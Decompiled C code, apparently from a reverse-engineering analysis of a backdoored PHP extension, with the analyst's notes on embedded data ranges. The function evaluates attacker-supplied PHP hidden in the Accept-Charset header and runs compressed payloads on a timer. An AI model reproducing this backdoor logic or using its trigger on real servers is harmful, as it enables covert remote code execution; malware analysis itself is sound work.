@@ -1,0 +1,213 @@
+int __cdecl sub_100031F0(int a1, int a2, _DWORD *a3)
+{
+  int v3; // edx
+  int v4; // eax
+  int v5; // ecx
+  int v6; // eax
+  int v7; // esi
+  char *v8; // edi
+  char *v9; // ecx
+  int v10; // eax
+  char *v11; // esi
+  int v12; // eax
+  char *v13; // edi
+  char *v14; // ecx
+  _DWORD *v15; // esi
+  int v16; // eax
+  int v17; // edx
+  int v18; // eax
+  int v19; // edi
+  _DWORD *v20; // esi
+  int result; // eax
+  int v22; // eax
+  int v23; // ecx
+  int v24; // eax
+  int v25; // edi
+  _DWORD *v26; // esi
+  char v27; // [esp+Dh] [ebp-19Bh]
+  __int16 v28; // [esp+BDh] [ebp-EBh]
+  char v29; // [esp+BFh] [ebp-E9h]
+  char v30; // [esp+C0h] [ebp-E8h]
+  char v31; // [esp+100h] [ebp-A8h]
+  char v32; // [esp+140h] [ebp-68h]
+  char v33; // [esp+180h] [ebp-28h]
+  const char ***v34; // [esp+184h] [ebp-24h]
+  int v35; // [esp+188h] [ebp-20h]
+  int v36; // [esp+18Ch] [ebp-1Ch]
+  const char ***v37; // [esp+190h] [ebp-18h]
+  int v38; // [esp+194h] [ebp-14h]
+  _DWORD **v39; // [esp+198h] [ebp-10h]
+  int v40; // [esp+19Ch] [ebp-Ch]
+  char *v41; // [esp+1A0h] [ebp-8h]
+  char *v42; // [esp+1A4h] [ebp-4h]
+
+  memset(&v27, 0, 0xB0u);
+  v28 = 0;
+  v3 = *a3;
+  v29 = 0;
+  if ( *(_BYTE *)(*(_DWORD *)(v3 + 4 * core_globals_id - 4) + 210) )
+    zend_is_auto_global(aServer, 7, a3);
+  zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, 8, &v33);
+  if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1
+    && zend_hash_find(**v39, aHttpAcceptEnco, strlen(aHttpAcceptEnco) + 1, &v34) != -1 )
+  {
+    if ( !strcmp(**v34, aGzipDeflate) )
+    {
+      if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1
+        && zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) != -1 )// HTTP_ACCEPT_CHARSET
+      {
+        v40 = sub_100040B0(**v37, strlen(**v37));
+        if ( v40 )
+        {
+          v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+          v5 = *(_DWORD *)(v4 + 296);
+          *(_DWORD *)(v4 + 296) = &v30;
+          v35 = v5;
+          v6 = setjmp3(&v30, 0);
+          v7 = v35;
+          if ( v6 )
+            *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
+          else
+            zend_eval_string(v40, 0, &byte_10012884, a3);
+          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
+        }
+      }
+    }
+    else
+    {
+      v12 = strcmp(**v34, aCompressGzip);
+      if ( !v12 )
+      {
+        v13 = &byte_10012884;
+        v14 = (char *)&unk_1000D66C;
+        v42 = &byte_10012884;
+        v15 = &unk_1000D66C;
+        while ( 1 )
+        {
+          if ( *v15 == 39 )
+          {
+            v13[v12] = 92;
+            v42[v12 + 1] = *v14;
+            v12 += 2;
+            v15 += 2;
+          }
+          else
+          {
+            v13[v12++] = *v14;
+            ++v15;
+          }
+          v14 += 4;
+          if ( (signed int)v14 >= (signed int)&unk_1000E5C4 )
+            break;
+          v13 = v42;
+        }
+        spprintf(&v36, 0, aVSMS, byte_100127B8, Dest);
+        spprintf(&v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+        v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+        v17 = *(_DWORD *)(v16 + 296);
+        *(_DWORD *)(v16 + 296) = &v32;
+        v40 = v17;
+        v18 = setjmp3(&v32, 0);
+        v19 = v40;
+        if ( v18 )
+        {
+          v20 = a3;
+          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v40;
+        }
+        else
+        {
+          v20 = a3;
+          zend_eval_string(v42, 0, &byte_10012884, a3);
+        }
+        result = 0;
+        *(_DWORD *)(*(_DWORD *)(*v20 + 4 * executor_globals_id - 4) + 296) = v19;
+        return result;
+      }
+    }
+  }
+  if ( dword_10012AB0 - dword_10012AA0 >= dword_1000D010 && dword_10012AB0 - dword_10012AA0 < 6000 )
+  {
+    if ( strlen(byte_100127B8) == 0 )
+      sub_10004480(byte_100127B8);
+    if ( strlen(Dest) == 0 )
+      sub_10004380(Dest);
+    if ( strlen(byte_100127EC) == 0 )
+      sub_100044E0(byte_100127EC);
+    v8 = &byte_10012884;
+    v9 = asc_1000D028;
+    v41 = &byte_10012884;
+    v10 = 0;
+    v11 = asc_1000D028;
+    while ( 1 )
+    {
+      if ( *(_DWORD *)v11 == 39 )
+      {
+        v8[v10] = 92;
+        v41[v10 + 1] = *v9;
+        v10 += 2;
+        v11 += 8;
+      }
+      else
+      {
+        v8[v10++] = *v9;
+        v11 += 4;
+      }
+      v9 += 4;
+      if ( (signed int)v9 >= (signed int)&unk_1000D66C )
+        break;
+      v8 = v41;
+    }
+    spprintf(&v41, 0, aEvalSS, aGzuncompress, v41);
+    v22 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+    v23 = *(_DWORD *)(v22 + 296);
+    *(_DWORD *)(v22 + 296) = &v31;
+    v38 = v23;
+    v24 = setjmp3(&v31, 0);
+    v25 = v38;
+    if ( v24 )
+    {
+      v26 = a3;
+      *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;
+    }
+    else
+    {
+      v26 = a3;
+      zend_eval_string(v41, 0, &byte_10012884, a3);
+    }
+    *(_DWORD *)(*(_DWORD *)(*v26 + 4 * executor_globals_id - 4) + 296) = v25;
+    if ( dword_1000D010 < 3600 )
+      dword_1000D010 += 3600;
+    ftime(&dword_10012AA0);
+  }
+  ftime(&dword_10012AB0);
+  if ( dword_10012AA0 < 0 )
+    ftime(&dword_10012AA0);
+  return 0;
+}
+
+
+
+
+
+
+________________________________________________________________
+
+v14 = (char *)&unk_1000D66C;
+if ( (signed int)v14 >= (signed int)&unk_1000E5C4 )
+
+>>>unk_1000D66C - unk_1000E5C4
+
+>>>1000D66C - 1000E5C4
+
+>>>BC000000B500000069000000 - 0000005C000000ADB53201
+
+________________________________________________________________
+v9 = asc_1000D028;
+if ( (signed int)v9 >= (signed int)&unk_1000D66C )
+
+>>>asc_1000D028 - unk_1000D66C
+
+>>>1000D028 - 1000D66C
+
+>>>7265737300000000 -  DA000000ED00000054000000EB000000
+________________________________________________________________
